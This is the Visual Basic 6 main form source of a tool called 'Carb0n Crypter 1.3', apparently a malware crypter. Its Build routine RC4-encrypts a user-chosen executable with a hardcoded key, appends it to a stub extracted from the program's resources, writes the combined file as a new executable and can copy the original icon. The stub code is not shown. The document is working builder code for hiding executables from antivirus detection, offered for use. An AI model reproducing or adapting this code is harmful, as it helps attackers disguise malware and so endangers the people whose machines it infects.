VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Carb0n Crypter 1.3"
   ClientHeight    =   2415
   ClientLeft      =   6615
   ClientTop       =   7020
   ClientWidth     =   5505
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2415
   ScaleWidth      =   5505
   StartUpPosition =   1  'CenterOwner
   Begin VB.CommandButton Command4 
      Caption         =   "About"
      Height          =   255
      Left            =   4320
      TabIndex        =   4
      Top             =   2040
      Width           =   1095
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Options"
      Height          =   255
      Left            =   1320
      TabIndex        =   3
      Top             =   2040
      Width           =   1095
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Browse"
      Height          =   255
      Left            =   4320
      TabIndex        =   2
      Top             =   1560
      Width           =   1095
   End
   Begin MSComDlg.CommonDialog CommonDialog1 
      Left            =   5040
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
      DefaultExt      =   ".exe"
      FileName        =   "file.exe"
      Filter          =   "Executables (*.exe)|*.exe"
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   120
      OLEDropMode     =   1  'Manual
      TabIndex        =   0
      Text            =   "File Path..."
      Top             =   1560
      Width           =   4095
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Build"
      Height          =   255
      Left            =   120
      TabIndex        =   1
      Top             =   2040
      Width           =   1095
   End
   Begin VB.Image Image1 
      Height          =   1125
      Left            =   120
      Picture         =   "Form1.frx":08CA
      Top             =   120
      Width           =   5250
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Sub Command1_Click()
Dim Info As String
Dim Stub As String
Dim sData() As Byte
Dim sFile As Long
sFile = FreeFile
sData() = LoadResData("EXE", "CUSTOM")

If Text1.Text = "" Or Text1.Text = "File Path..." Then
MsgBox "Please select a file.", vbInformation
Exit Sub
Else
End If

Open App.Path & "/Stub.exe" For Binary Access Write As #sFile
Put #sFile, , sData()
Close #sFile
Open App.Path & "/Stub.exe" For Binary Access Read As #1
Stub = Input(LOF(1), 1)
Close #1
Stub = Stub & "1234567890"
Open Text1.Text For Binary Access Read As #1
Info = Info & Input(LOF(1), 1)
Close #1

Info = RC4_String(Info, "xlm32api")
CommonDialog1.DialogTitle = "Select Output"
CommonDialog1.DefaultExt = "exe"
CommonDialog1.Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
CommonDialog1.ShowSave

Open CommonDialog1.FileName For Binary Access Write As #1
Put #1, 1, Stub & Info
Close #1
Info = ""
Kill App.Path & "/Stub.exe"

If Options.Check1.Value = 1 Then
Call ReplaceIcons(Options.Text1.Text, Text1.Text, vbNullString)
Else
End If

MsgBox "Success! File is now crypted.", vbOKOnly
End Sub

Private Sub Command2_Click()
CommonDialog1.DialogTitle = "Please Select Executable"
CommonDialog1.FileName = vbNullString
CommonDialog1.DefaultExt = "exe"
CommonDialog1.Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
CommonDialog1.ShowOpen
Text1.Text = CommonDialog1.FileName
End Sub

Private Sub Command3_Click()
Options.Show
End Sub

Private Sub Command4_Click()
FrmAbout.Show
End Sub

Private Sub Form_Initialize()
InitCommonControlsXP
End Sub

Private Sub Form_Load()
With nid
.cbSize = Len(nid)
.hwnd = Me.hwnd
.uId = vbNull
.uFlags = NIF_ICON Or NIF_TIP Or NIF_MESSAGE Or NIF_INFO
.uCallBackMessage = WM_MOUSEMOVE
.hIcon = Me.Icon
.szTip = "Carb0n Crypter 1.3" & vbNullChar
.dwState = 0
.dwStateMask = 0
.szInfo = "Carb0n Crypter 1.3 is now loaded." & Chr(0)
.szInfoTitle = "Initializing." & Chr(0)
.uTimeout = 10
End With
Shell_NotifyIcon NIM_ADD, nid
End Sub

Private Sub Form_Unload(Cancel As Integer)
Call Shell_NotifyIcon(NIM_DELETE, nid)
Unload Form1
Unload Options
Unload FrmAbout
End
End Sub

Private Sub text1_OLEDragDrop(Data As DataObject, Effect As Long, Button As Integer, Shift As Integer, X As Single, Y As Single)
Text1.Text = Data.Files(1)
End Sub
